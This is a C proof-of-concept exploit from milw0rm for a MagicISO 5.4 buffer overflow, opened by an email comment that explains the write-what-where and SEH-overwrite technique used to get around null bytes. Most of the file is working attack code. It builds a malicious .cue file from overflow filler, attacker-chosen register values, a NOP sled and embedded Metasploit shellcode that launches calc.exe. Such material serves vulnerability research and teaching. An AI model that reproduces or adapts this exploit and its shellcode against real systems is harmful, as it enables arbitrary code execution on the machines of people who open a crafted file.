/*
-- poc/demo for magiciso exploit, found by n00b
-- by: v9@fakehalo.us

-- original email reply comments:

I actually looked into this when you posted this on milw0rm.  I was able to get it to run arbitrary code, however it was so unreliable it wasn't worth me posting... however, it was informative.

you have control of several registers, however it's eax and edx(not ecx) that are most interesting... the next instructions that get called(and fault magiciso) are:

MOV DWORD PTR DS:[EDX],EAX
MOV DWORD PTR DS:[EAX+4],EDX

...now, with that you can overwrite any 4byte area in memory with anything you want.  the problem is you can't use null bytes(which is where the shellcode and the current SEH handler is(non-PEB)) in this situation. (and the 2nd MOV can trigger an exception, which you will want to overwrite the handler of)

you can possibly use other methods, like you mentioned(although i didnt try for this situation), but i chose to write SEH handler for that block (if you trigger it with a bunch of x's it will show up right under it in ollydbg)

step 1 for making the 0x00?????? (EDX) nullbyte:
you can just so happen to happen to overwrite this buffer with full control until the end of the buffer.  so, when most (C) functions write to a buffer they will cap it with an 0x00 on the end, i just used that.  so the overflow has to be an EXACT size for that to work.

step 2 for making the 0x00?????? (EAX) nullbyte:
once i had control of where i was writing EAX to (EDX), i had to figure out a way to make another nullbyte as that is where the shellcode was located.  to do this i came up with overwriting the SEH handler off-by-one, overwriting a single throw-away byte into another memory address(that would never be used), and leaving the original null-byte that was already there.

the downside to this is there is there was nothing left to keep track of where the shellcode was, ie a simple CALL reg wasn't possible as by the time i gained control of EIP there was no trace of where i was...so it became a blind guess, and memory gets pretty scattered...never the less, it is exploitable, and i popped up several calc.exe's when testing :)

even if not reliable, i found it an interesting workaround for null-bytes.  carry on if you like, here's the code i was using to test(which is functional, just not reliable):

*/

#include <stdio.h>
#include <stdlib.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <getopt.h>

/* winXP SP2 home (24bit, the first byte(0x00) will not be used) */
#define DFL_EAX 0xfd3ddd
#define DFL_EDX 0x12fb37

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 */
/* Encoder=PexFnstenvSub http://metasploit.com */
static unsigned char x86_exec[] =
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x23"
"\x75\xbf\x4a\x83\xeb\xfc\xe2\xf4\xdf\x9d\xfb\x4a\x23\x75\x34\x0f"
"\x1f\xfe\xc3\x4f\x5b\x74\x50\xc1\x6c\x6d\x34\x15\x03\x74\x54\x03"
"\xa8\x41\x34\x4b\xcd\x44\x7f\xd3\x8f\xf1\x7f\x3e\x24\xb4\x75\x47"
"\x22\xb7\x54\xbe\x18\x21\x9b\x4e\x56\x90\x34\x15\x07\x74\x54\x2c"
"\xa8\x79\xf4\xc1\x7c\x69\xbe\xa1\xa8\x69\x34\x4b\xc8\xfc\xe3\x6e"
"\x27\xb6\x8e\x8a\x47\xfe\xff\x7a\xa6\xb5\xc7\x46\xa8\x35\xb3\xc1"
"\x53\x69\x12\xc1\x4b\x7d\x54\x43\xa8\xf5\x0f\x4a\x23\x75\x34\x22"
"\x1f\x2a\x8e\xbc\x43\x23\x36\xb2\xa0\xb5\xc4\x1a\x4b\x0b\x67\xa8"
"\x50\x1d\x27\xb4\xa9\x7b\xe8\xb5\xc4\x16\xde\x26\x40\x5b\xda\x32"
"\x46\x75\xbf\x4a";

struct{
 unsigned int eax;
 unsigned int edx;
 char *file;
 char *dir;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
unsigned char write_cue(char *,unsigned int,unsigned int);
void printe(char *,short);
void usage(char *);

/* start. */
int main(int argc,char **argv){
 signed int chr=0;
 char *ptr;

 printf("[*] magiciso[v5.4/build 0239]: buffer overflow exploit.\n"
 "[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n"
 "[*] found by: n00b\n\n");

 tbl.eax=DFL_EAX;
 tbl.edx=DFL_EDX;

 while((chr=getopt(argc,argv,"m:a:d:"))!=EOF){
  switch(chr){
   case 'm':
    if(!tbl.dir){
     if(!(ptr=rindex(optarg,'/')))
      ptr=optarg;
     else ptr++;
     if(!(tbl.dir=(char *)strdup(optarg)))
       printe("main(): allocating memory failed",1);
     if(!(tbl.file=(char *)malloc(strlen(ptr)+5)))
      printe("main(): allocating memory failed",1);
     sprintf(tbl.file,"%s.cue",ptr); 
    }
    break;
   case 'a':
    sscanf(optarg,"%x",&tbl.eax);
    break;
   case 'd':
    sscanf(optarg,"%x",&tbl.edx);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }

 if(((tbl.eax&0xff000000)>>24))
  printe("EAX address isn't 24bit/3 bytes.",1);
 if(((tbl.edx&0xff000000)>>24))
  printe("EDX address isn't 24bit/3 bytes.",1);

 if(!tbl.file)usage(argv[0]);

 printf("[*] directory:\t\t\t%s\n",tbl.dir);
 printf("[*] filename:\t\t\t%s/%s\n",tbl.dir,tbl.file);
 printf("[*] EAX address:\t\t0x[00]%.6x\n",tbl.eax);
 printf("[*] EDX address:\t\t0x[00]%.6x\n\n",tbl.edx);

 if(mkdir(tbl.dir,0755))
  printe("failed to make directory.",1);
 if(chdir(tbl.dir))
  printe("failed to chdir to new directory.",1);

 if(write_cue(tbl.file,tbl.eax,tbl.edx))
  printe("failed to write to file.",1);

 exit(0);
}

/* write the .cue file. */
unsigned char write_cue(char *file,unsigned int eax,unsigned int edx){
 unsigned int i=0;
 unsigned int real_eax=eax-4;
 unsigned char filler='x';
 unsigned char nop=0x90;
 FILE *fs;
 if(!(fs=fopen(file, "wb")))return(1);

 /* the "C:" is to make the overflowed buffer a static size. */
 fprintf(fs,"FILE \"C:");
 for(i=0;i<1022;i++){
  fwrite(&filler,1,1,fs);
 }

 /* this is an unused byte, the off-by-one write that keeps */
 /* the original null-byte in the SEH handler making this written */
 /* to one byte above the SEH handler. (fills in EAX) */
 fwrite(&filler,1,1,fs);

 fwrite(&tbl.eax,3,1,fs);
 fwrite(&tbl.edx,3,1,fs);

 /* --- */
 /* overflown buffer stops here, putting a null-byte on */ 
 /* the end of the string to keep the null-byte for EDX */

 fprintf(fs,"\" BINARY\nTRACK 01 MODE1/2355\nINDEX 01 00:00:00\n");

 /* simply throwing the nops/shellcode into memory at the end of the file. */
 for(i=0;i<500;i++){
  fwrite(&nop,1,1,fs);
 }
 fwrite(&x86_exec,sizeof(x86_exec),1,fs);

 fclose(fs);
 return(0);
}

/* error! */
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}

/* usage. */
void usage(char *progname){
 printf("syntax: %s [-ad] -m directory\n\n",progname);
 printf("  -m <dir>\tdirectory to make and output .cue to.\n");
 printf("  -a <addr>\tEAX address, will become the SEH handler"
 " (0x[00]%.6x)\n",tbl.eax);
 printf("  -d <addr>\tEDX address, points to where the SEH handler is"
 " (0x[00]%.6x)\n\n",tbl.edx);
 exit(0);
}

// milw0rm.com [2007-05-23]
